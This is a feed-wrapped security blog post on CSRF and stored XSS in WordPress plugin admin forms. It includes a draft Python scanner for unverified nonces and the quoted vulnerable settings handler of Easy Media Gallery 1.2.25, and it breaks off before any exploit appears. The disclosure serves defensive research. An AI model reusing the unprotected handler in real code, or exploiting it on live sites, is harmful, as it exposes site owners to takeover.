<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Coding, Learning and IT Security</title><link href="/" rel="alternate"></link><link href="/feeds/php-programming-security-wordpress.atom.xml" rel="self"></link><id>/</id><updated>2013-12-17T12:16:00+01:00</updated><entry><title>Exploiting wordpress plugins through admin options (No 3. — Easy Media Gallery stored XSS)</title><link href="/exploiting-wordpress-plugins-using-insecure-admin-forms-no-3-example-exploit-included.html" rel="alternate"></link><updated>2013-12-17T12:16:00+01:00</updated><author><name>admin</name></author><id>tag:,2013-12-17:exploiting-wordpress-plugins-using-insecure-admin-forms-no-3-example-exploit-included.html</id><summary type="html">&lt;h3&gt;Preface&lt;/h3&gt;
&lt;p&gt;This post is about general security weaknesses in wordpress plugins,
that allow malicious attackers to gain code execution access on the web
server (which is quite often the user www-data). To outline the problem
shortly: Often, wordpress plugins need a administration form to handle
settings and options. These options are meant to be exclusively
alterable by the admin of the wordpress site. But unfortunately, lots of
wordpress plugins suffer from a very dangerous combination of
&lt;a href="http://epiqo.com/en/all-your-pants-are-danger-csrf-explained" title="CSRF explained"&gt;CSRF&lt;/a&gt;
and stored XSS vulnerabilities, that wrapped up in a social engineering
approach, may break the site.&lt;/p&gt;
&lt;p&gt;I have done some research in the past about such attacks. You can read
about a &lt;a href="http://incolumitas.com/2013/07/27/no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k/" title="stored xss in flash album gallery"&gt;stored xss in flash album gallery
plugin&lt;/a&gt;
as well as my findings about a similar flaw in the &lt;a href="http://incolumitas.com/2013/03/15/no-1-wp-members-interesting-peristant-xss-leading-to-remote-code-execution/"&gt;wp members
plugin&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;How does the attack vector look like?&lt;/h3&gt;
&lt;p&gt;First we need to understand how administration menus are created in
wordpress, because these forms are the point where data flows into a
application. You can learn more about the underlying concept on
&lt;a href="http://codex.wordpress.org/Administration_Menus" title="administration menues in wordpress"&gt;wordpress
codex&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But the crucial point to understand is, that they all consist of forms,
independently of the fact that you can pack your options under a
predefined and already existing top level menu like &lt;em&gt;Tools&lt;/em&gt; or
&lt;em&gt;Settings&lt;/em&gt;, or that you can create your own top level menu with a call
to
&lt;a href="http://codex.wordpress.org/Function_Reference/add_menu_page" title="add_menu_page function"&gt;add_menu_page()&lt;/a&gt;.&lt;br /&gt;
In either way, you are going to populate your new menu with one or more
forms. Wordpress tries to indicate the general direction for the best
practices with the &lt;a href="http://codex.wordpress.org/Settings_API" title="the wordpress settings API"&gt;settings
API&lt;/a&gt;.
The API basically implements security checks (nonces to be specific) for
the forms and avoids a lot of complex debugging of the underlying
options management (no need to tinker with databases).&lt;br /&gt;
In particular, the security checks prevent
&lt;a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery"&gt;CSRF&lt;/a&gt; attacks
by including a &lt;a href="http://en.wikipedia.org/wiki/Cryptographic_nonce"&gt;nonce&lt;/a&gt;
sent with any request. Such a form with nonces would look like the
following (The example shows the beginning of the general sub-level menu
form from the &lt;em&gt;Settings&lt;/em&gt; top-level menu):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;options.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hidden&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;option_page&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;general&amp;#39;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;action&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;update&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_wpnonce&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_wpnonce&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;aa07348d33&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_wp_http_referer&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/~nikolai/wordpress_pentest/wordpress/wp-admin/options-general.php&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;table&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;form-table&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
[...]
&lt;span class="nt"&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So any attacker that now tries to fool a victim into executing a
specific action by submitting a form, needs to know the nonces value.
But she certainly can't know this nonce, because it was created randomly
while generating the form in the first place. Hence without a valid
nonce, wordpress denies the processing of any action associated with the
form data.&lt;/p&gt;
&lt;p&gt;Now there wouldn't be any problem at all, if every form was protected
with nonces. But wait a second. After reading yet another &lt;a href="http://codex.wordpress.org/WordPress_Nonces" title="wp nonces"&gt;codex page
about nonces&lt;/a&gt;,
we can begin asking ourselves questions: Is adding nonces actually
enough to secure actions?&lt;/p&gt;
&lt;p&gt;No, of course it's not enough. You also need to verify them. It may be
obvious for people who know how CSRF attacks works, but I saw quite some
plugins where forms were equipped with nonce creation functions like
&lt;em&gt;wp_create_nonce()&lt;/em&gt;, &lt;em&gt;wp_nonce_field()&lt;/em&gt; or &lt;em&gt;wp_nonce_url()&lt;/em&gt; but
the associated action just wasn't verified for validity with the
corresponding functions &lt;em&gt;check_admin_referer()&lt;/em&gt;,
&lt;em&gt;check_ajax_referer()&lt;/em&gt; or &lt;em&gt;wp_verify_nonce()&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Some months ago, I made a quick python script that extracts all calls to
nonce creation functions and simply checks whether there is a respective
call to a nonce verification function. If there's not, there might be a
CSRF vulnerability.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;__author__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;nikolai tschacher&amp;#39;&lt;/span&gt;

&lt;span class="c"&gt;# Unfinished.&lt;/span&gt;
&lt;span class="c"&gt;# Idea: Maybe use a lexer/tokenizer to process PHP function signatures. But it still remains a really tough task&lt;/span&gt;
&lt;span class="c"&gt;# to verify if a nonce with a specific action get&amp;#39;s verified or not. One approach is to look for the $action string.&lt;/span&gt;
&lt;span class="c"&gt;# But we&amp;#39;re screwed if this string is created dynamically in a expression and is not a simple string literal.&lt;/span&gt;

&lt;span class="c"&gt;# Simple idea: Just *count* all nonce creation functions and all nonce verification functions. If there there a less&lt;/span&gt;
&lt;span class="c"&gt;# of the latter, actions might be unverified and thus vulnerable to CSRF attacks.&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;argparse&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;

&lt;span class="c"&gt;# stores all action strings to nonce creation function like:&lt;/span&gt;
&lt;span class="c"&gt;# - wp_nonce_url( $actionurl, $action = -1, $name = &amp;#39;_wpnonce&amp;#39; )&lt;/span&gt;
&lt;span class="c"&gt;# - wp_nonce_field( $action = -1, $name = &amp;quot;_wpnonce&amp;quot;, $referer = true , $echo = true )&lt;/span&gt;
&lt;span class="c"&gt;# - wp_create_nonce( $action = -1 )&lt;/span&gt;
&lt;span class="c"&gt;# The appropriate regex. This is quite harsh to do correctly since you essentially need to parse a PHP function call signature&lt;/span&gt;
&lt;span class="c"&gt;# with some plain regexes...&lt;/span&gt;
&lt;span class="n"&gt;nonces_created&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="n"&gt;NONCE_CREATION_FUNCTIONS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;r&amp;#39;&amp;#39;&amp;#39;(wp_nonce_url|wp_nonce_field|wp_create_nonce)\s*\(\s*(\s*\$action\s*=\s*)?(&amp;quot;|&amp;#39;)\s*\w*\s*(&amp;quot;|&amp;#39;)\s*\)&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;COUNT_NONCE_CF&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;r&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# holds all nonce verification functions as:&lt;/span&gt;
&lt;span class="c"&gt;# - wp_verify_nonce( $nonce, $action = -1 )&lt;/span&gt;
&lt;span class="c"&gt;# - check_admin_referer( $action = -1, $query_arg = &amp;#39;_wpnonce&amp;#39; )&lt;/span&gt;
&lt;span class="c"&gt;# - check_ajax_referer( $action = -1, $query_arg = false, $die = true )&lt;/span&gt;
&lt;span class="n"&gt;nonces_verified&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;walk_plugin_files&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dirs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;walk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;collect_nonces&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;nonces_created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;NONCE_CREATION_FUNCTIONS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;finditer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())])&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;UnicodeDecodeError&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;verify_nonces&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ArgumentParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;plugin_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;the path to a wordpress plugin that should be checked for CSRF&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                        &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_args&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="c"&gt;# First collect all occurrences of nonces&lt;/span&gt;
    &lt;span class="n"&gt;walk_plugin_files&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plugin_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;collect_nonces&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c"&gt;# And then try do check whether nonces are also checked before an action&lt;/span&gt;
    &lt;span class="n"&gt;walk_plugin_files&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plugin_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify_nonces&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nonces_created&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Where's the problem then?&lt;/h3&gt;
&lt;p&gt;Nowhere and everywhere ;)&lt;/p&gt;
&lt;p&gt;Although the security architecture in the wordpress core seems to be
okay (As far as I can judge it - Honestly I didn't really dig &lt;em&gt;deep
enough&lt;/em&gt; to find potential flaws), a lot of missing functionality that
the slim wordpress core lacks, can be enhanced by adding plugins.&lt;br /&gt;
Furthermore, it's a unfortunate fact, that a lot of plugin authors tend
to be unaware of the many possibilities to blunder in security critical
code (Myself included - Writing about web security and programming
completely flawless is not exclusive apparently).&lt;br /&gt;
And that is exactly the root of all evil: Although we can give security
unaware programmers plenty of good concepts and tools (Like the settings
API or this &lt;a href="http://codex.wordpress.org/Data_Validation" title="data validation in wordpress"&gt;codex
article&lt;/a&gt;)
and they will still fail to manufacture solid and found plugin code.&lt;/p&gt;
&lt;h3&gt;Can we force plugin coders to program more securely&lt;/h3&gt;
&lt;p&gt;I think we can. For instance, we could force plugin authors to provide
nonces for all forms that they create, regardless of the nature of the
action itself (I mean, are there cases where nonces would be
counterproductive or even annoying?). Additionally, we need to enforce
that for every nonce created, there must be a function such as&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;wp_verify_nonce( \$nonce, \$action = -1 )&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;check_admin_referer( \$action = -1, \$query_arg = '_wpnonce' )&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;check_ajax_referer( \$action = -1, \$query_arg = false, \$die =
    true )&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;that verfies that the action stemmed from the intended origin.&lt;/p&gt;
&lt;p&gt;I can already hear people cry that there is no way to force people to
write secure programs. But in my oppinion, there are general guidelines
that at least prevent some common security problems. And hell: Wordpress
plugins really suffer from the combined threat of XSS and CSRF!&lt;/p&gt;
&lt;h3&gt;A concrete example — Stored XSS in Easy Media Gallery&lt;/h3&gt;
&lt;p&gt;Right at the start some information about the plugin:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Plugin name: Easy Media Gallery&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wordpress.org/plugins/easy-media-gallery/" title="easy media gallery"&gt;Plugin
    URL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Vendor: &lt;a href="http://ghozylab.com/" title="ghozylab"&gt;Ghozylab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Vulnerable version:
    &lt;a href="http://wordpress.org/plugins/easy-media-gallery/developers/"&gt;1.2.25&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Downloads: 124,042&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I didn't need to dig deep to find a very critical security vulnerability
in the Easy Media Gallery plugin. In the file
&lt;em&gt;wp-content/plugins/easy-media-gallery/includes/settings.php&lt;/em&gt; on line
14, the following function (reformatted, because the original source
code is a pain to read) causes a lot of inconvenience:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;spg_add_admin&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;global&lt;/span&gt; &lt;span class="nx"&gt;$emgplugname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$theshort&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$theopt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;is_admin&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;emg_settings&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;post_type&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;easymediagallery&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;save&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;$curtosv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;easy_media_opt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$theopt&lt;/span&gt; &lt;span class="nx"&gt;as&lt;/span&gt; &lt;span class="nx"&gt;$theval&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;$curtosv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$theval&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$theval&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
                &lt;span class="nx"&gt;update_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;easy_media_opt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$curtosv&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="nx"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: edit.php?post_type=easymediagallery&amp;amp;page=emg_settings&amp;amp;saved=true&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;die&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;reset&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

            &lt;span class="c1"&gt;// RESTORE DEFAULT SETTINGS&lt;/span&gt;
            &lt;span class="nx"&gt;easymedia_restore_to_default&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// END&lt;/span&gt;

            &lt;span class="nx"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: edit.php?post_type=easymediagallery&amp;amp;page=emg_settings&amp;amp;reset=true&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;die&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="nx"&gt;add_submenu_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
